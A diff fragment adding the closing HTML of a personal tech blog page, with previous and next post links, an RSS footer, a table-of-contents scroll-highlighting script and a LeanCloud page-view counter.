+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2021-02-08-java-security-learning/">
+                <h3 class="post-title" style="text-align: left;">
+                  Java Security Study Notes (Basic)
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2020-9-30-fluent-py-study-notes/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  Fluent Python Study Notes
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
